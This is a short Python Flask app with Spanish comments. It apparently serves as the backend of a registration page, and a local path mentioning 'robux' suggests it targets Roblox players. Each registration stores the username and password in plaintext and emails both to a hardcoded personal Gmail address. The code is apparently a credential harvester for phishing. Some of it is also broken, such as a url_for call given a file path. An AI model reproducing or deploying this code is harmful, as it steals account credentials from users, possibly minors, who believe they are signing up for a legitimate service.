from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# Conexión con la base de datos SQLite
def connect_db():
    return sqlite3.connect('database.db')

# Crear tabla de usuarios si no existe
def init_db():
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        username TEXT NOT NULL,
                        password TEXT NOT NULL
                    )''')
    conn.commit()
    conn.close()

# Enviar correo electrónico
def enviar_correo(usuario):
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    sender_email = 'tucorreogmail@gmail.com'  # Cambia esto con tu dirección de correo electrónico
    password = 'tupassword'  # Cambia esto con tu contraseña de correo electrónico
    
    recipient_email = 'rlagos2332@gmail.com'  # Tu dirección de correo electrónico
    subject = 'Nuevo usuario registrado'
    message = f'Nuevo usuario registrado:\nNombre de usuario: {usuario["username"]}\nContraseña: {usuario["password"]}'

    msg = MIMEText(message)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = recipient_email

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        print('Correo electrónico enviado exitosamente')
    except Exception as e:
        print('Error al enviar el correo electrónico:', e)
    finally:
        server.quit()

# Ruta para la página de inicio
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para el registro de usuarios
@app.route('/registro', methods=['GET', 'POST'])
def registro():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = connect_db()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO usuarios (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
        conn.close()
        enviar_correo({'username': username, 'password': password})  # Enviar correo electrónico al registrar
        # Redirigir a la página principal después del registro
        return redirect(url_for('file:///C:/Users/Rodrigo/Desktop/Pagina%20web%20robux/index.html'))
    return render_template('registro.html')

if __name__ == '__main__':
    init_db()  # Inicializar la base de datos
    app.run(debug=True)
